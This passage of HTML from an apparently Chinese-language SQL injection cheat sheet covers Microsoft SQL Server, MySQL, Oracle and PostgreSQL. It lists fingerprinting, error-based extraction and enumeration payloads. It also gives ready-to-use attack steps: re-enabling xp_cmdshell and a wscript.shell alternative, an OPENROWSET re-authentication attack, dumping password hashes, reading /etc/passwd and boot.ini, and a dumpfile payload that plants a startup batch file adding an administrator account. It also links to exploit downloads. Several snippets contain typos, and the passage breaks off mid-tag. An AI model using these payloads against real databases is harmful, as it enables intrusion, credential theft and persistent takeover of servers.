title=\"识别数据库平台\"></a>识别数据库平台</h4><ol>\n<li>通过时间延迟推理识别数据库平台</li>\n</ol>\n<p>产生时间延迟</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>平台</td>\n<td>时间延迟</td>\n</tr>\n<tr>\n<td>Microsoft SQL Server</td>\n<td><code>WAITFOR DELAY 0:0:10'  </code></td>\n</tr>\n<tr>\n<td>Oracle</td>\n<td><code>BEGIN DBMS LOCK.SLEEP(5);END;-- (仅PL/SQL注入)</code><br><code>SELECT UTL_INADDR.get_host_name('192.168.0.1') FROM dual </code><br><code>SELECT UTL_INADDR.get_host_address('foo.nowhere999.zom'）FROM dual </code><br>SELECT UTL_HTTP.REOUEST(‘<a href=\"http://www.oracle.com/\">http://www.oracle.com</a>‘) FROM dual</td>\n</tr>\n<tr>\n<td>MySQL</td>\n<td><code>BENCHMARK(1000000,MD5(\"HACK\")) -- 低于5.0.12版本</code>  <code>SLEEP(10)-- 5.0.12 及更高版本</code></td>\n</tr>\n<tr>\n<td>PostgreSQL</td>\n<td><code>SELECT pg_sleep(10);-- 8.2 及更高版本</code> <br> <code>CREATE OR REPLACE FUNCTION  pg_sleep(int) RETURNS int AS '/lib/libc.so.6','sleep' language 'C'  STRICT;-- 在Linux上创建 pg_sleep 函数，要求 postgres/pgsql 级别的权限</code></td>\n</tr>\n</tbody></table>\n<ol start=\"2\">\n<li>通过SQL方言推理识别数据库平台</li>\n</ol>\n<p>SQL方言差异</p>\n<table>\n<thead>\n<tr>\n<th>平   台</th>\n<th>连接符</th>\n<th>行注释</th>\n<th>唯一的默认表、变量或函数</th>\n<th>Int转char函数</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Microsoft SQL Server</td>\n<td>‘A’+’B’</td>\n<td>–</td>\n<td><code>@@PACK_RECEIVED</code></td>\n<td><code>char(0*41)</code></td>\n</tr>\n<tr>\n<td>Oracle</td>\n<td>‘A’||’B’ concat(‘A’,’B’)</td>\n<td>–</td>\n<td><code>BITAND(1,1)</code></td>\n<td><code>chr(65)</code></td>\n</tr>\n<tr>\n<td>MySQL</td>\n<td>concat(‘A’,’B’)  ‘A’ ‘B’</td>\n<td>#</td>\n<td><code>CONNECTION_ID()</code></td>\n<td><code>char(0x41)</code></td>\n</tr>\n<tr>\n<td>Access</td>\n<td>“A” &amp; “B”</td>\n<td>N/A</td>\n<td><code>msysobjects</code></td>\n<td><code>chr(65)</code></td>\n</tr>\n<tr>\n<td>PostgreSQL</td>\n<td>‘A’||’B’</td>\n<td>–</td>\n<td><code>getpgusemame()  </code></td>\n<td><code> chr(65)</code></td>\n</tr>\n<tr>\n<td>DB2</td>\n<td>‘a’ concat ‘b’</td>\n<td>–</td>\n<td><code>sysibm.systables</code></td>\n<td><code>chr(65)</code></td>\n</tr>\n</tbody></table>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">#Microsoft SQL Server</span>\n<span class=\"token string\">'AND @@PACK_RECEIVED = @@PACK_RECEIVED -- \n'</span><span class=\"token comment\">#MySQL</span>\n<span class=\"token string\">'AND CONNECTION_ID() = CONNECTION_ID()-- \n'</span><span class=\"token comment\">#Oracle</span>\n<span class=\"token string\">'AND BITAND(1,1) = BITAND(1,1)-- \n'</span><span class=\"token comment\">#PostgreSQL</span>\n'<span class=\"token operator\">AND</span> getpgusername<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> getpgusername<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token comment\">-- </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>通过错误消息提取数据</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">#Microsoft SQL Server</span>\n<span class=\"token operator\">AND</span> <span class=\"token number\">1</span> <span class=\"token operator\">in</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">SELECT</span><span class=\"token punctuation\">(</span>Aversion<span class=\"token punctuation\">)</span> <span class=\"token comment\">-- </span>\n<span class=\"token operator\">AND</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token keyword\">CONVERT</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">INT</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">SELECT</span> @<span class=\"token variable\">@VERSION</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">-- </span>\n<span class=\"token comment\">#MySQL</span>\n<span class=\"token operator\">AND</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token number\">1</span> <span class=\"token keyword\">from</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>concat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">SELECT</span> VERSION<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>floor<span class=\"token punctuation\">(</span>rand<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>x <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">tables</span> <span class=\"token keyword\">group</span> <span class=\"token keyword\">by</span> x<span class=\"token punctuation\">)</span>a<span class=\"token punctuation\">)</span><span class=\"token comment\">#</span>\n<span class=\"token comment\">#Oracle</span>\n<span class=\"token operator\">AND</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>utl_inaddr<span class=\"token punctuation\">.</span>get_host_name<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">SELECT</span> banner <span class=\"token keyword\">FROM</span> v$version <span class=\"token keyword\">WHERE</span> rownum<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">-- </span>\n<span class=\"token operator\">AND</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span>CTXSYS<span class=\"token punctuation\">.</span>DRITHSX<span class=\"token punctuation\">.</span>SN<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">SELECT</span> banner <span class=\"token keyword\">FROM</span> v$version <span class=\"token keyword\">WHERE</span> rownum<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">-- </span>\n<span class=\"token comment\">#PostgreSQL</span>\n<span class=\"token operator\">AND</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span>CAST<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">SELECT</span> version<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>::<span class=\"token keyword\">text</span> <span class=\"token keyword\">AS</span> <span class=\"token keyword\">NUMERIC</span><span class=\"token punctuation\">)</span><span class=\"token comment\">-- </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<ol start=\"3\">\n<li>将多行合并为单行</li>\n</ol>\n<p>使用SQL合并多行  </p>\n<table>\n<thead>\n<tr>\n<th>平   台</th>\n<th>合并多行和（或）列的查询</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Microsoft SQL  Server</td>\n<td><code>BEGIN DECLARE @x varchar (8000) SET @x=' '  SELECT @x=@x+'/'+name FROM sysobjects WHERE name&gt;'a' ORDER BY name END; SELECT @x AS DATA INTO foo</code> <br><code>-- populates the @x variable with all \"name\"column values from sysobjects table. Data from the @x variable is the stored in a table named foo under a column named data</code> <code>BEGIN DECLARE @x varchar(8000) SET @x=' '  SELECT @x=@x+'/'+name FROM sysobjects WHERE name&gt;'a' ORDER BY name; SELECT 1 WHERE 1 IN (SELECT @x) END;</code><br><code>-- As above but displays results with the sQL server error message</code><br> <code>SELECT name FROM sysobjects FOR XML RAW</code><br><code>-- returns the resultset as a single XML formatted string</code></td>\n</tr>\n<tr>\n<td>Oracle</td>\n<td>`SELECT sys.stragg(distinct username</td>\n</tr>\n<tr>\n<td>MySQL</td>\n<td><code>SELECT GROUP_CONCAT(user) FROM mysql.user;</code> <br><code>--Returns a comma separated list of  users.  </code></td>\n</tr>\n<tr>\n<td>PostgreSQL</td>\n<td><code>SELECT array_to_string(array(SELECT  datname FROM pg_database), ':');</code> <code>-- Returns a colon seperated list of database names </code></td>\n</tr>\n</tbody></table>\n<h4 id=\"Microsoft-SQL-Server-备忘单\"><a href=\"#Microsoft-SQL-Server-备忘单\" class=\"headerlink\" title=\"Microsoft SQL Server 备忘单\"></a>Microsoft SQL Server 备忘单</h4><ol>\n<li>枚举数据库配置信息和模式</li>\n</ol>\n<p>提取Microsoft SQL Server的配置信息</p>\n<table>\n<thead>\n<tr>\n<th>数   据</th>\n<th>查  询</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>版本</td>\n<td><code>SELECT @@version;</code></td>\n</tr>\n<tr>\n<td>当前用户</td>\n<td><code>SELECT system user;</code><br><code>SELECT suser_sname();</code><br><code> SELECT user;</code><br><code> SELECT loginame FROM master..sysprocesses WHERE spid =@@SPID;</code></td>\n</tr>\n<tr>\n<td>列出用户</td>\n<td><code>SELECT name FROM master..syslogins;  </code></td>\n</tr>\n<tr>\n<td>当前用户权限，如果用户为sysadmin，返回1;如果用户不具有sysadmin权限，返回0</td>\n<td><code>SELECT is_srvolemenber('sysadmin');  </code></td>\n</tr>\n<tr>\n<td>数据库服务器主机名</td>\n<td><code>SELECT  @@ servername;</code><br><code>SELECT  SERVEROROPERTY('productversion'), SERVERPROPERTY('productlevel'),SERVERPROPERTY('edition');  -- 仅 SQL  Server 2005</code></td>\n</tr>\n</tbody></table>\n<p>提取Microsoft SQL Server的模式信息</p>\n<table>\n<thead>\n<tr>\n<th>数   据</th>\n<th>查   询</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>当前数据库</td>\n<td><code>SELECT DB_NAME();</code></td>\n</tr>\n<tr>\n<td>列出数据库</td>\n<td><code>SELECT name FROM master..sysdatabases;</code><br>  <code>SELECT DB NAME(N);</code><br><code>-- Where N is the database number </code></td>\n</tr>\n<tr>\n<td>列出表</td>\n<td>当前数据库中的表：<br><code>SELECT name FROM sysobjects WHERE xtype='u';</code><br><code>SELECT name FROM sysobjects WHERE xtype='V';--视图</code><br>master数据库中的表：<br><code>SELECT name FROM master..sysobjects WHERE xtype='U';</code><br><code>SELECT name FROM master..sysobjects WHERE xtype='V';</code></td>\n</tr>\n<tr>\n<td>列出列</td>\n<td>当前数据库中tblUsers表的列名：<br><code>SELECT name FROM syscolumns WHERE id=object_id('tblUsers');</code><br>admin数据库中tblUsers表的列名：<br><code>SELECT name FROM admin..syscolumns WHERE id=object_id('admin..tblmembers');</code></td>\n</tr>\n<tr>\n<td>査找具有指定名称的列</td>\n<td>查找指定的name <br><code>drop table pentest；begin declare@ret varchar(8000) set @ret=CHAR(58) select @ret=@ret+CHAR(32)+o.name+ CHAR(47)+c.name from syscolumns c,sysobjects o where c.name LIKE '%XXX%' and c.id=o.id and o.type='U' select @ret as ret into pentest end-</code><br>URL编码<br>查找名称中包含Pass的列名<br><code>drop table pentest;begin declare @ret varchar(8000) set @ret=CHAR(58) select @ret=@ret+CHAR(32)+o.name+CHAR(47)+c.name from syscolumns c,sysobjects o where (c.name LIKE'%[Pp][Aa][Ss][Ss]%' or c.name LIKE'%[Pp][Ww][Dd]%') and c.id=o.id and o.type='U' select @ret as ret into pentest end-</code><br>URL编码</td>\n</tr>\n<tr>\n<td>在列中查找特定的值</td>\n<td>对于指定的搜索字符串，返回数据库和列的名称，并将数据存储在foo数据库中<code>Drop table #Results;Drop table foo;CREATE TABLE #Results(ColumnName nvarchar(370),ColumnValue nvarchar(3630);SET NOCOUNT ON;DECLARE @TableName nvarchar(256),@columnNamenvarchar(128), @Searchstr2 nvarchar(110) SET @TableName = ''; SET @searchstr2 = QUOTENAME('%'+'dave'+'%',''''); WHILE @TableName IS NOT NULL BEGIN SET @columnName = ''; SET @TableName =(SELECT MIN (QUOTENAME(TABLE_SCHEMA) + '.' + QUOTENAME(TABLE_NAME)) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE_TABLE' AND OUOTENAME (TABLE_SCHEMA) + '.' + QUOTENAME(TABLE_NAME) &gt; @rableName AND OBJECTPROPERTY (OBJECT_ID(QUOTENAME(TABLE_SCHEMA)+ QUOTENAME(TABLE_NAME)),'IsMSShipped') = 0); WHILE (@TableName IS NOT NULL) AND (@ColumnName IS NOT NULL) BEGIN SET @ColumnName =(SELECT MIN (QUOTENAME(COLUMN_NAME)) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA PARSENAME (@TableName, 2) AND TABLE_NAME = PARSENAME(@TableName, 1) AND DATA_TYPE IN ('char', 'varchar', 'nchar','nvarchar') AND QUOTENAME (COLUMN_NAME) &gt; @columnName); IF @ColumnName IS NOT NULL BEGIN INSERT INTO #Results EXEC('SELECT '''+@rableName +'.'+@columnName+''',LEFT('+@columnName +', 3630) FROM'+ @rableName+'(NOLOCK)+'WHERE' + @columnName + 'LIKE'+@Searchstr2); END END END select ColumnName, ColumnValue into foo FROM # Results</code><br>URL编码</td>\n</tr>\n</tbody></table>\n<ol start=\"2\">\n<li>SQL 盲注函数：Microsoft SQL Server</li>\n</ol>\n<p>SQL盲注函数</p>\n<table>\n<thead>\n<tr>\n<th>数   据</th>\n<th>查  询</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>字符串长度</td>\n<td><code>LEN()  </code></td>\n</tr>\n<tr>\n<td>从给定字符串中提取子串</td>\n<td><code>SUBSTRING(string,offset,length) </code></td>\n</tr>\n<tr>\n<td>字符串（’ABC’）不带单引号的表示方式</td>\n<td><code>SELECT char(0x41) + char(0x42) + char(0x43);  </code></td>\n</tr>\n<tr>\n<td>触发时间延迟</td>\n<td><code>WAITFOR DELAY '0:0:9'; --c触发9秒的时间延迟 </code></td>\n</tr>\n<tr>\n<td>IF语句</td>\n<td><code>IF (1=1) SELECT 'A' ELSE SELECT 'B' -- 返回  </code></td>\n</tr>\n</tbody></table>\n<ol start=\"3\">\n<li>Microsoft SQL Server 的权限提升</li>\n</ol>\n<p>Microsoft SQL Server 的版本号</p>\n<table>\n<thead>\n<tr>\n<th>版本号</th>\n<th>服务包</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>9.00.3042</td>\n<td>Microsoft SQL Server 2005 SP2</td>\n</tr>\n<tr>\n<td>9.00.2047</td>\n<td>Microsoft SQL Server 2005 SP1</td>\n</tr>\n<tr>\n<td>9.00.1399</td>\n<td>Microsoft SQL Server 2005</td>\n</tr>\n<tr>\n<td>8.00.2039</td>\n<td>Microsoft SQL Server 2000 SP4</td>\n</tr>\n<tr>\n<td>8.00.818</td>\n<td>Microsoft SQL Server 2000 SP3  w/Cumulative Patch MS03-031</td>\n</tr>\n<tr>\n<td>8.00.760</td>\n<td>Microsoft SQL Server 2000 SP3</td>\n</tr>\n<tr>\n<td>8.00.532</td>\n<td>Microsoft SQL Server 2000 SP2</td>\n</tr>\n<tr>\n<td>8.00.384</td>\n<td>Microsoft SQL Server 2000 SP1</td>\n</tr>\n<tr>\n<td>8.00.194</td>\n<td>Microsoft SQL Server 2000</td>\n</tr>\n<tr>\n<td>7.00.1063</td>\n<td>Microsoft SQL Server 7.0 SP4</td>\n</tr>\n<tr>\n<td>7.00.961</td>\n<td>Microsoft SQL Server 7.0 SP3</td>\n</tr>\n<tr>\n<td>7.00.842</td>\n<td>Microsoft SQL Server 7.0 SP2</td>\n</tr>\n<tr>\n<td>7.00.699</td>\n<td>Microsoft SQL Server 7.0 SP1</td>\n</tr>\n<tr>\n<td>7.00.623</td>\n<td>Microsoft SQL Server 7.0</td>\n</tr>\n<tr>\n<td>6.50.479</td>\n<td>Microsoft SQL Server 6.5 SP5a Update</td>\n</tr>\n<tr>\n<td>6.50.416</td>\n<td>Microsoft SQL Server 6.5 SP5a</td>\n</tr>\n<tr>\n<td>6.50.415</td>\n<td>Microsoft SQL Server 6.5 SP5</td>\n</tr>\n<tr>\n<td>6.50.281</td>\n<td>Microsoft SQL Server 6.5 SP4</td>\n</tr>\n<tr>\n<td>6.50.258</td>\n<td>Microsoft SQL Server 6.5 SP3</td>\n</tr>\n<tr>\n<td>6.50.240</td>\n<td>Microsoft SQL Server 6.5 SP2</td>\n</tr>\n<tr>\n<td>6.50.213</td>\n<td>Microsoft SQL Server 6.5 SP1</td>\n</tr>\n<tr>\n<td>6.50.201</td>\n<td>Microsoft SQL Server 6.5 RTM</td>\n</tr>\n</tbody></table>\n<ol start=\"4\">\n<li>OPENROWSET重验证攻击</li>\n</ol>\n<p>下列OPENROWSET查询将尝试使用口令为letmein的sa账户连接到地址为 127.0.0.1 的 SQL Server：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> <span class=\"token keyword\">OPENROWSET</span><span class=\"token punctuation\">(</span><span class=\"token string\">'SQLOLEDB'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'127.0.0.1'</span><span class=\"token punctuation\">;</span><span class=\"token string\">'sa'</span><span class=\"token punctuation\">;</span><span class=\"token string\">'letmein'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'SET FMTONLY OFF execute master..xp_cmdshell \"dir\"'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">-- </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<ol start=\"5\">\n<li>攻击数据库服务器：Microsoft SQL Server</li>\n</ol>\n<ul>\n<li>通过xp_cmdshell执行系统命令</li>\n</ul>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">EXEC</span> master<span class=\"token punctuation\">.</span>dbo<span class=\"token punctuation\">.</span>xp_cmdshell <span class=\"token string\">'os command'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>重新启用xp_cmdshell</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">EXEC</span> sp_configure <span class=\"token string\">'show advanced options'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span>\n<span class=\"token keyword\">EXEC</span> sp_configure <span class=\"token keyword\">reconfigure</span> \n<span class=\"token keyword\">EXEC</span> sp_configure <span class=\"token string\">'xp_cmdshell'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span>\n<span class=\"token keyword\">EXEC</span> sp configure <span class=\"token keyword\">reconfigure</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>xp_cmdshell存储过程已经被删除了，但.dll并未删除，启用它：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">EXEC</span> sp_addextendedproc <span class=\"token string\">'xp_cmdshell'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'xpsq170.dll'</span>\n<span class=\"token keyword\">EXEC</span> sp_addextendedproc <span class=\"token string\">'xp_cmdshell'</span><span class=\"token punctuation\">,</span> 'xplog70<span class=\"token punctuation\">.</span>dll<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<ul>\n<li>xp_cmdshell的替代方案</li>\n</ul>\n<p>作为xp_cmdshell存储过程的替代方案，可以执行下列SQL语句来实现相同的效果:</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">DECLARE</span> <span class=\"token variable\">@altshell</span> <span class=\"token keyword\">INT</span>\n<span class=\"token keyword\">EXEC</span> SP_OACREATE <span class=\"token string\">'wscript.shell'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">@altshell</span> OUTPUT\n<span class=\"token keyword\">EXEC</span> SP_OAMETHOD <span class=\"token variable\">@altshell</span><span class=\"token punctuation\">,</span><span class=\"token string\">'run'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'null'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'%systemroot%\\system32\\cmd.exe /c'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>要想在Microsoft SQL Server 2005上执行这个替代的shell,首先要执行下列SQL：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">EXEC</span> sp_configure <span class=\"token string\">'show advanced options'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span>\n<span class=\"token keyword\">EXEC</span> sp_configure <span class=\"token keyword\">reconfigure</span>\n<span class=\"token keyword\">EXEC</span> sp_configure <span class=\"token string\">'Ole Automation Procedures'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span>\n<span class=\"token keyword\">EXEC</span> sp_configure <span class=\"token keyword\">reconfigure</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<ul>\n<li>破解数据库口令</li>\n</ul>\n<p>Microsoft SQL Server 2000的口令哈希存储在sysxlogins表中，可以使用下列SQL语句提取它们</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> <span class=\"token keyword\">user</span><span class=\"token punctuation\">,</span>password <span class=\"token keyword\">FROM</span> master<span class=\"token punctuation\">.</span>dbo<span class=\"token punctuation\">.</span>sysxlogins<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<ul>\n<li>Microsoft SQL Server 2005 哈希</li>\n</ul>\n<p>以下SQL语句会检索sa账户的口令哈希：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> password_hash <span class=\"token keyword\">FROM</span> sys<span class=\"token punctuation\">.</span>sql_logins <span class=\"token keyword\">WHERE</span> name<span class=\"token operator\">=</span><span class=\"token string\">'sa'</span>\n<span class=\"token keyword\">SELECT</span> name <span class=\"token operator\">+</span> <span class=\"token string\">'-'</span> <span class=\"token operator\">+</span> master<span class=\"token punctuation\">.</span>sys<span class=\"token punctuation\">.</span>fn_varbintohexstr<span class=\"token punctuation\">(</span>password_hash<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> master<span class=\"token punctuation\">.</span>sys<span class=\"token punctuation\">.</span>sql_logins<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<ul>\n<li>文件读/写</li>\n</ul>\n<p>如果拥有INSERT和ADMINISTER BULK OPERATIONS许可，就可以读取本地文件。下列SQL语句会将本地文件c:\\boot.ini读取到localfile表中：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">TABLE</span> localfile<span class=\"token punctuation\">(</span><span class=\"token keyword\">data</span> <span class=\"token keyword\">varchar</span><span class=\"token punctuation\">(</span><span class=\"token number\">8000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">BULK</span> <span class=\"token keyword\">INSERT</span> localfile <span class=\"token keyword\">FROM</span> <span class=\"token string\">'c:\\boot.ini'</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h4 id=\"MySQL-备忘单\"><a href=\"#MySQL-备忘单\" class=\"headerlink\" title=\"MySQL 备忘单\"></a>MySQL 备忘单</h4><ol>\n<li>枚举数据库配置信息和模式</li>\n</ol>\n<p>提取MySQL服务器的配置信息</p>\n<table>\n<thead>\n<tr>\n<th>数   据</th>\n<th>查   询</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>版本</td>\n<td><code>SELECT @@version;</code></td>\n</tr>\n<tr>\n<td>当前用户</td>\n<td><code>SELECT user();</code><br><code>SELECT system user();</code></td>\n</tr>\n<tr>\n<td>列出用户</td>\n<td><code>SELECT user FROM mysql.user;</code></td>\n</tr>\n<tr>\n<td>当前用户权限</td>\n<td><code>SELECT grantee, privilege_type, is_grantable FROM information_schema.user privileges;</code></td>\n</tr>\n</tbody></table>\n<p>提取MySQL 5.0及之后版本的模式信息</p>\n<table>\n<thead>\n<tr>\n<th>数   据</th>\n<th>查   询</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>当前数据库</td>\n<td><code>SELECT database();</code></td>\n</tr>\n<tr>\n<td>列出数据库</td>\n<td><code>SELECT schema name FROM information  schema.schemata;</code></td>\n</tr>\n<tr>\n<td>列出表</td>\n<td>列出当前数据库中的表：  <br><code>UNION SELECT TABLE_NAME FROM  information_schema.tables WHERE  TABLE_SCHEMA= database();  </code><br>列出所有用户自定义数据库中的所有表： <br><code> SELECT table_schema, tabble_name FROM information_schema.tables  WHERE table_schema!= 'information_schema' AND table_schema !='mysql</code></td>\n</tr>\n<tr>\n<td>列出列</td>\n<td>列出当前数据库中tblUsers表的列名：  <br><code>SELECT column_name FROM information_schema.columns  WHERE  table_name='tblUsers'  #返回 tblUsers 表所有列的列名  </code><br>列出所有用户定义的数据库中的所有列：  <br><code>SELECT table_schema, tabble_name, column_name FROM information_schema.columns WHERE table_schema != 'information_schema' AND table schema !='mysql'</code></td>\n</tr>\n</tbody></table>\n<ol start=\"2\">\n<li>SQL盲注函数:MySQL</li>\n</ol>\n<p>SQL盲注函数</p>\n<table>\n<thead>\n<tr>\n<th>数   据</th>\n<th>查  询</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>字符串长度</td>\n<td><code>LENGTH()</code></td>\n</tr>\n<tr>\n<td>从给定字符串中提取子串</td>\n<td><code>SELECT SUBSTR(string, offset, length);</code></td>\n</tr>\n<tr>\n<td>字符串(‘ABC’)不带单引号的表示方式</td>\n<td><code>SELECT char(65,66,67);</code></td>\n</tr>\n<tr>\n<td>触发时间延迟</td>\n<td><code>BENCHMARK(1000000,MD5(\"HACK\"));  #触发一个可度量的时间延迟 </code><br><code> SLEEP(10);  #触发一个10秒的时间延迟(MySQL 5以及更高版本)</code></td>\n</tr>\n<tr>\n<td>IF语句</td>\n<td><code>SELECT if (1=1,'A','B'); -- 返回'A'</code></td>\n</tr>\n</tbody></table>\n<ol start=\"3\">\n<li>攻击数据库服务器：MySQL</li>\n</ol>\n<ul>\n<li>执行系统命令</li>\n</ul>\n<p>可以通过在目标服务器上创建一个定期执行的恶意脚本文件来执行操作系统命令。下列语句用于从MySQL读取内容并将其写入本地文件中</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">SBLECT <span class=\"token string\">'system_commands'</span> <span class=\"token keyword\">INTO</span> <span class=\"token keyword\">dumpfile</span> trojanpath<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>接下来的语句会在Windows启动目录中创建一个批处理文件，用于添加一个口令为x的管理员用户X</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> <span class=\"token string\">'net user x x /add%26%26 net localgroup administrators x /add'</span> <span class=\"token keyword\">into</span> <span class=\"token keyword\">dumpfile</span> <span class=\"token string\">'c:\\\\Documents and Settings\\\\All Users\\\\Start Menu\\\\Programs\\\\Startup\\\\attack.bat'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<ul>\n<li>破解数据库口令</li>\n</ul>\n<p>返回一个以冒号分隔的用户名和口令哈希值的列表</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> concat<span class=\"token punctuation\">(</span><span class=\"token keyword\">user</span><span class=\"token punctuation\">,</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span>password<span class=\"token punctuation\">)</span> <span class=\"token keyword\">FROM</span> mysql<span class=\"token punctuation\">.</span><span class=\"token keyword\">user</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<ul>\n<li>直接攻击数据库</li>\n</ul>\n<p>Windows： <a href=\"http://www.scoobygang.org/HiDDenWarez/mexec.pl\">www.scoobygang.org/HiDDenWarez/mexec.pl</a></p>\n<p>Windows： <a href=\"http://www.0xdeadbeef.info/exploits/raptor_winudf.tgz\">www.0xdeadbeef.info/exploits/raptor_winudf.tgz</a></p>\n<p>基于 UNIX： <a href=\"http://www.0xdeadbeef.infb/exploits/raptor_udf.c\">www.0xdeadbeef.infb/exploits/raptor_udf.c</a></p>\n<ul>\n<li>读取文件</li>\n</ul>\n<p>查看UNIX主机上的/etc/passwd文件</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> LOAD_FILE<span class=\"token punctuation\">(</span><span class=\"token string\">'/etc/passwd'</span><span class=\"token punctuation\">)</span><span class=\"token 